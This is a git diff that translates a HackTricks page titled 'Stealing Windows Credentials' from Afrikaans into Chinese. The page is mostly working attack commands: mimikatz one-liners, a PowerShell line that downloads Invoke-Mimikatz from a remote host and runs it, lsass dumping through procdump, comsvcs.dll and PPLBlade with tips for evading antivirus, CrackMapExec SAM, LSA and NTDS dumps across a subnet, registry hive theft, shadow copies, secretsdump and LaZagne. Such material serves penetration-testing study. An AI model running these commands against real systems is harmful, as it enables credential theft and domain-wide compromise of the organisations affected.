@@ -1,16 +1,16 @@
 # Stealing Windows Credentials
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
@@ -29,7 +29,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Vind ander dinge wat Mimikatz kan doen in** [**hierdie bladsy**](credentials-mimikatz.md)**.**
+**在** [**此页面**](credentials-mimikatz.md)**中查找Mimikatz可以做的其他事情。**
 
 ### Invoke-Mimikatz
 ```bash
@@ -37,11 +37,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Leer meer oor sommige moontlike beskermings van geloofsbriewe hier.**](credentials-protections.md) **Hierdie beskermings kan voorkom dat Mimikatz sekere geloofsbriewe onttrek.**
+[**在这里了解一些可能的凭据保护措施。**](credentials-protections.md) **这些保护措施可以防止 Mimikatz 提取某些凭据。**
 
-## Geloofsbriewe met Meterpreter
+## 使用 Meterpreter 的凭据
 
-Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om **te soek na wagwoorde en hashes** binne die slagoffer.
+使用我创建的 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **在受害者内部搜索密码和哈希。**
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -58,12 +58,12 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-## Om AV te omseil
+## 绕过 AV
 
 ### Procdump + Mimikatz
 
-Aangesien **Procdump van** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'n wettige Microsoft-gereedskap** is, word dit nie deur Defender opgespoor nie.\
-Jy kan hierdie gereedskap gebruik om die **lsass-proses te dump**, **die dump af te laai** en die **akkrediteeringe plaaslik** uit die dump te **onttrek**.
+由于 **Procdump 来自** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**是一个合法的 Microsoft 工具**，因此不会被 Defender 检测到。\
+您可以使用此工具来 **转储 lsass 进程**，**下载转储文件**并 **从转储中提取** **凭据**。 
 
 {% code title="Dump lsass" %}
 ```bash
@@ -75,7 +75,7 @@ Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 {% endcode %}
 
-{% code title="Onttrek kredensiale uit die dump" %}
+{% code title="从转储中提取凭据" %}
 ```c
 //Load the dump
 mimikatz # sekurlsa::minidump lsass.dmp
@@ -84,46 +84,46 @@ mimikatz # sekurlsa::logonPasswords
 ```
 {% endcode %}
 
-Hierdie proses word outomaties gedoen met [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+此过程通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成： `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Nota**: Sommige **AV** mag **ontdek** as **kwaadaardig** die gebruik van **procdump.exe om lsass.exe te dump**, dit is omdat hulle die string **"procdump.exe" en "lsass.exe"** **ontdek**. Dit is dus **stealthier** om die **PID** van lsass.exe as 'n **argument** aan procdump **oor te dra** in plaas van die **naam lsass.exe.**
+**注意**：某些 **AV** 可能会将 **procdump.exe 用于转储 lsass.exe** 视为 **恶意**，这是因为它们正在 **检测** 字符串 **"procdump.exe" 和 "lsass.exe"**。因此，将 **lsass.exe 的 PID** 作为参数传递给 procdump **而不是** **lsass.exe 的名称** 更加 **隐蔽**。
 
-### Dumping lsass met **comsvcs.dll**
+### 使用 **comsvcs.dll** 转储 lsass
 
-'n DLL genaamd **comsvcs.dll** wat in `C:\Windows\System32` gevind word, is verantwoordelik vir **dumping prosesgeheue** in die geval van 'n ongeluk. Hierdie DLL sluit 'n **funksie** genaamd **`MiniDumpW`** in, wat ontwerp is om aangeroep te word met `rundll32.exe`.\
-Dit is irrelevant om die eerste twee argumente te gebruik, maar die derde een is in drie komponente verdeel. Die proses-ID wat gedump moet word, vorm die eerste komponent, die dump-lêer ligging verteenwoordig die tweede, en die derde komponent is streng die woord **vol**. Geen alternatiewe opsies bestaan nie.\
-Wanneer hierdie drie komponente ontleed word, word die DLL betrokke by die skep van die dump-lêer en die oordrag van die gespesifiseerde proses se geheue na hierdie lêer.\
-Die gebruik van die **comsvcs.dll** is haalbaar vir die dumping van die lsass-proses, wat die behoefte om procdump op te laai en uit te voer, uitskakel. Hierdie metode word in detail beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+名为 **comsvcs.dll** 的 DLL 位于 `C:\Windows\System32`，负责在崩溃事件中 **转储进程内存**。此 DLL 包含一个名为 **`MiniDumpW`** 的 **函数**，旨在通过 `rundll32.exe` 调用。\
+使用前两个参数是无关紧要的，但第三个参数分为三个部分。要转储的进程 ID 是第一部分，转储文件位置是第二部分，第三部分严格是单词 **full**。没有其他选项。\
+解析这三个部分后，DLL 开始创建转储文件并将指定进程的内存转移到该文件中。\
+利用 **comsvcs.dll** 可以转储 lsass 进程，从而无需上传和执行 procdump。此方法的详细信息可在 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) 中找到。
 
-Die volgende opdrag word gebruik vir uitvoering:
+以下命令用于执行：
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
-**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
+**您可以使用** [**lssasy**](https://github.com/Hackndo/lsassy)**自动化此过程。**
 
-### **Dumping lsass met Taakbestuurder**
+### **使用任务管理器转储 lsass**
 
-1. Regsklik op die Taakbalk en klik op Taakbestuurder
-2. Klik op Meer besonderhede
-3. Soek vir "Plaaslike Sekuriteitsowerheid Proses" proses in die Prosesse-oortjie
-4. Regsklik op "Plaaslike Sekuriteitsowerheid Proses" proses en klik op "Skep dump-lêer".
+1. 右键单击任务栏，然后单击任务管理器
+2. 单击更多详细信息
+3. 在进程选项卡中搜索“本地安全授权进程”
+4. 右键单击“本地安全授权进程”，然后单击“创建转储文件”。
 
-### Dumping lsass met procdump
+### 使用 procdump 转储 lsass
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is 'n Microsoft-ondertekende binêre wat 'n deel is van [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是一个微软签名的二进制文件，是 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件的一部分。
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-## Dumpin lsass met PPLBlade
+## Dumpin lsass with PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is 'n Gekapte Proses Dumper Tool wat ondersteuning bied vir die obfuskering van geheue-dump en die oordrag daarvan na afstandswerkstasies sonder om dit op die skyf te laat val.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一个受保护进程转储工具，支持对内存转储进行混淆，并在不将其写入磁盘的情况下将其传输到远程工作站。
 
-**Belangrike funksies**:
+**主要功能**：
 
-1. Omseiling van PPL-beskerming
-2. Obfuskering van geheue-dump lêers om Defender se handtekening-gebaseerde opsporingsmeganismes te ontwyk
-3. Oplaai van geheue-dump met RAW en SMB oplaai metodes sonder om dit op die skyf te laat val (fileless dump)
+1. 绕过 PPL 保护
+2. 混淆内存转储文件以规避 Defender 基于签名的检测机制
+3. 使用 RAW 和 SMB 上传方法上传内存转储，而不将其写入磁盘（无文件转储）
 
 {% code overflow="wrap" %}
 ```bash
@@ -133,51 +133,51 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 
 ## CrackMapExec
 
-### Dump SAM hashes
+### 转储 SAM 哈希
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Dump LSA geheime
+### 转储 LSA 秘密
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Dump die NTDS.dit van teiken DC
+### 从目标 DC 转储 NTDS.dit
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Dump die NTDS.dit wagwoordgeskiedenis van die teiken DC
+### 从目标 DC 转储 NTDS.dit 密码历史记录
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
-### Wys die pwdLastSet attribuut vir elke NTDS.dit rekening
+### 显示每个 NTDS.dit 账户的 pwdLastSet 属性
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
 ## Stealing SAM & SYSTEM
 
-Hierdie lêers behoort **geleë** te wees in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM._ Maar **jy kan dit nie net op 'n gewone manier kopieer nie** omdat hulle beskerm is.
+这些文件应该**位于**_C:\windows\system32\config\SAM_和_C:\windows\system32\config\SYSTEM._ 但是**你不能以常规方式复制它们**，因为它们受到保护。
 
 ### From Registry
 
-Die maklikste manier om daardie lêers te steel, is om 'n kopie van die register te kry:
+窃取这些文件的最简单方法是从注册表获取副本：
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**Laai** daardie lêers na jou Kali masjien en **onttrek die hashes** met:
+**下载**这些文件到你的Kali机器，并使用以下命令**提取哈希**：
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-### Volume Shadow Copy
+### 卷影复制
 
-Jy kan 'n kopie van beskermde lêers maak met behulp van hierdie diens. Jy moet 'n Administrateur wees.
+您可以使用此服务复制受保护的文件。您需要是管理员。
 
-#### Gebruik vssadmin
+#### 使用 vssadmin
 
-Die vssadmin-binary is slegs beskikbaar in Windows Server weergawes
+vssadmin 二进制文件仅在 Windows Server 版本中可用。
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -190,7 +190,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Maar jy kan dieselfde doen vanaf **Powershell**. Dit is 'n voorbeeld van **hoe om die SAM-lêer te kopieer** (die hardeskyf wat gebruik word is "C:" en dit word gestoor in C:\users\Public) maar jy kan dit gebruik om enige beskermde lêer te kopieer:
+但是你可以通过 **Powershell** 做同样的事情。这是 **如何复制 SAM 文件** 的一个例子（使用的硬盘是 "C:"，并保存到 C:\users\Public），但你可以用它来复制任何受保护的文件：
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -201,86 +201,86 @@ $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
 ### Invoke-NinjaCopy
 
-Laastens kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om 'n kopie van SAM, SYSTEM en ntds.dit te maak.
+最后，您还可以使用 [**PS 脚本 Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 来复制 SAM、SYSTEM 和 ntds.dit。
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
-## **Active Directory Kredensiale - NTDS.dit**
+## **Active Directory 凭据 - NTDS.dit**
 
-Die **NTDS.dit** lêer is bekend as die hart van **Active Directory**, wat belangrike data oor gebruikersobjekte, groepe en hul lidmaatskap bevat. Dit is waar die **wagwoord hashes** vir domein gebruikers gestoor word. Hierdie lêer is 'n **Extensible Storage Engine (ESE)** databasis en is geleë by **_%SystemRoom%/NTDS/ntds.dit_**.
+**NTDS.dit** 文件被称为 **Active Directory** 的核心，保存有关用户对象、组及其成员资格的重要数据。它是存储域用户的 **密码哈希** 的地方。该文件是一个 **可扩展存储引擎 (ESE)** 数据库，位于 **_%SystemRoom%/NTDS/ntds.dit_**。
 
-Binne hierdie databasis word drie primêre tabelle gehandhaaf:
+在这个数据库中，维护着三个主要表：
 
-- **Data Tabel**: Hierdie tabel is verantwoordelik vir die stoor van besonderhede oor objektes soos gebruikers en groepe.
-- **Link Tabel**: Dit hou die verhouding, soos groep lidmaatskappe, dop.
-- **SD Tabel**: **Sekuriteitsbeskrywings** vir elke objek word hier gehou, wat die sekuriteit en toegangbeheer vir die gestoor objektes verseker.
+- **数据表**：该表负责存储有关用户和组等对象的详细信息。
+- **链接表**：它跟踪关系，例如组成员资格。
+- **SD 表**：每个对象的 **安全描述符** 存放在这里，确保存储对象的安全性和访问控制。
 
-Meer inligting hieroor: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
+有关更多信息：[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer en dit word deur _lsass.exe_ gebruik. Dan kan **gedeelte** van die **NTDS.dit** lêer **binne die `lsass`** geheue geleë wees (jy kan die nuutste toeganklike data vind waarskynlik as gevolg van die prestasie verbetering deur 'n **cache** te gebruik).
+Windows 使用 _Ntdsa.dll_ 与该文件进行交互，并由 _lsass.exe_ 使用。然后，**NTDS.dit** 文件的一部分可能位于 **`lsass`** 内存中（您可以找到最近访问的数据，可能是由于使用 **缓存** 提高了性能）。
 
-#### Ontsleuteling van die hashes binne NTDS.dit
+#### 解密 NTDS.dit 中的哈希
 
-Die hash is 3 keer versleuteld:
+哈希被加密三次：
 
-1. Ontsleutel Wagwoord Versleuteling Sleutel (**PEK**) met die **BOOTKEY** en **RC4**.
-2. Ontsleutel die **hash** met **PEK** en **RC4**.
-3. Ontsleutel die **hash** met **DES**.
+1. 使用 **BOOTKEY** 和 **RC4** 解密密码加密密钥 (**PEK**)。
+2. 使用 **PEK** 和 **RC4** 解密 **哈希**。
+3. 使用 **DES** 解密 **哈希**。
 
-**PEK** het die **selfde waarde** in **elke domeinbeheerder**, maar dit is **versleuteld** binne die **NTDS.dit** lêer met die **BOOTKEY** van die **SISTEEM lêer van die domeinbeheerder (is verskillend tussen domeinbeheerders)**. Dit is hoekom jy die kredensiale van die NTDS.dit lêer moet kry **jy het die lêers NTDS.dit en SISTEEM nodig** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** 在 **每个域控制器** 中具有 **相同的值**，但它在 **NTDS.dit** 文件中使用 **域控制器的 SYSTEM 文件的 BOOTKEY** 进行 **加密**（在不同的域控制器之间是不同的）。这就是为什么要从 NTDS.dit 文件中获取凭据 **您需要 NTDS.dit 和 SYSTEM 文件** (_C:\Windows\System32\config\SYSTEM_)。
 
-### Kopieer NTDS.dit met Ntdsutil
+### 使用 Ntdsutil 复制 NTDS.dit
 
-Beskikbaar sedert Windows Server 2008.
+自 Windows Server 2008 起可用。
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-You could also use the [**volume shadow copy**](./#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).
+您还可以使用 [**卷影复制**](./#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，您还需要 **SYSTEM 文件** 的副本（同样，您可以 [**从注册表转储或使用卷影复制**](./#stealing-sam-and-system) 技巧）。
 
-### **Onthou van hashes uit NTDS.dit**
+### **从 NTDS.dit 中提取哈希**
 
-Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
+一旦您 **获得** 了 **NTDS.dit** 和 **SYSTEM** 文件，您可以使用像 _secretsdump.py_ 这样的工具来 **提取哈希**：
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-U kan dit ook **outomaties onttrek** met 'n geldige domein admin gebruiker:
+您还可以使用有效的域管理员用户**自动提取它们**：
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-Vir **groot NTDS.dit lêers** word dit aanbeveel om dit te onttrek met [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+对于 **大 NTDS.dit 文件**，建议使用 [gosecretsdump](https://github.com/c-sto/gosecretsdump) 进行提取。
 
-Laastens kan jy ook die **metasploit module** gebruik: _post/windows/gather/credentials/domain\_hashdump_ of **mimikatz** `lsadump::lsa /inject`
+最后，您还可以使用 **metasploit 模块**：_post/windows/gather/credentials/domain\_hashdump_ 或 **mimikatz** `lsadump::lsa /inject`
 
-### **Onttrekking van domeinobjekte uit NTDS.dit na 'n SQLite-databasis**
+### **从 NTDS.dit 提取域对象到 SQLite 数据库**
 
-NTDS-objekte kan na 'n SQLite-databasis onttrek word met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Nie net word geheime onttrek nie, maar ook die hele objekte en hul eienskappe vir verdere inligtingonttrekking wanneer die rou NTDS.dit-lêer reeds verkry is.
+NTDS 对象可以使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) 提取到 SQLite 数据库中。不仅提取了秘密，还提取了整个对象及其属性，以便在原始 NTDS.dit 文件已被检索时进行进一步的信息提取。
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-Die `SYSTEM` hive is opsioneel maar laat toe vir die ontsleuteling van geheime (NT & LM hashes, aanvullende akrediteerbare soos duidelike teks wagwoorde, kerberos of vertrou sleutels, NT & LM wagwoord geskiedenisse). Saam met ander inligting, word die volgende data onttrek: gebruiker en masjien rekeninge met hul hashes, UAC vlae, tydstempel vir laaste aanmelding en wagwoord verandering, rekening beskrywing, name, UPN, SPN, groepe en rekursiewe lede, organisatoriese eenhede boom en lidmaatskap, vertroude domeine met vertroue tipe, rigting en eienskappe...
+The `SYSTEM` hive 是可选的，但允许解密秘密（NT 和 LM 哈希、补充凭据，如明文密码、kerberos 或信任密钥、NT 和 LM 密码历史）。除了其他信息外，提取以下数据：用户和机器账户及其哈希、UAC 标志、最后登录和密码更改的时间戳、账户描述、名称、UPN、SPN、组和递归成员资格、组织单位树和成员资格、受信任的域及其信任类型、方向和属性...
 
 ## Lazagne
 
-Laai die binêre van [hier](https://github.com/AlessandroZ/LaZagne/releases) af. Jy kan hierdie binêre gebruik om akrediteerbare uit verskeie sagteware te onttrek.
+从 [这里](https://github.com/AlessandroZ/LaZagne/releases) 下载二进制文件。您可以使用此二进制文件从多个软件中提取凭据。
 ```
 lazagne.exe all
 ```
-## Ander gereedskap om kredensiale uit SAM en LSASS te onttrek
+## 从SAM和LSASS提取凭据的其他工具
 
-### Windows credentials Editor (WCE)
+### Windows凭据编辑器（WCE）
 
-Hierdie gereedskap kan gebruik word om kredensiale uit die geheue te onttrek. Laai dit af van: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+此工具可用于从内存中提取凭据。下载地址：[http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-Onttrek kredensiale uit die SAM-lêer
+从SAM文件中提取凭据
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
 ```
 ### PwDump
 
-Onttrek geloofsbriewe uit die SAM-lêer
+从SAM文件中提取凭据
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
@@ -288,23 +288,23 @@ type outpwdump
 ```
 ### PwDump7
 
-Laai dit af van: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) en **voer dit net uit** en die wagwoorde sal onttrek word.
+从：[ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) 下载并**执行它**，密码将被提取。
 
-## Verdedigings
+## 防御
 
-[**Leer hier oor sommige kredensiaal beskermings.**](credentials-protections.md)
+[**在这里了解一些凭证保护。**](credentials-protections.md)
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
